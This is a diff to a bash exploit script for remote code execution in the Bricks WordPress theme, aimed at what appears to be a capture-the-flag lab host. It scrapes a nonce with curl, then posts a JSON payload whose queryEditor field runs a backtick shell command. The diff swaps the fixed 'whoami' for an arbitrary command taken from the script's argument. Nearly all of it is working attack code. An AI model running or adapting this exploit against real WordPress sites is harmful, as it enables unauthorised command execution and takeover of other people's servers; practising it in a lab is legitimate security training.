@@ -1,6 +1,7 @@
 #!/bin/bash
 # Script used to be able to run remote code executed in an exploit of Bricks render_elements - Bricks is a theme that can be used in WordPress
 
+COMANDO=$1
 HOST=bricks.thm
 
 NONCE=$(curl -k https://bricks.thm | grep -o '"nonce":"[^"]*"' | cut -d ":" -f 2 | tr -d '"')
@@ -17,7 +18,7 @@ curl -k -X POST https://$HOST/wp-json/bricks/v1/render_element \
       "type": "posts",
       "query": {
         "useQueryEditor": true,
-        "queryEditor": "throw new exception(`whoami`);",
+        "queryEditor": "throw new exception(`'$COMANDO'`);",
         "objectType": "post"
       }
     }
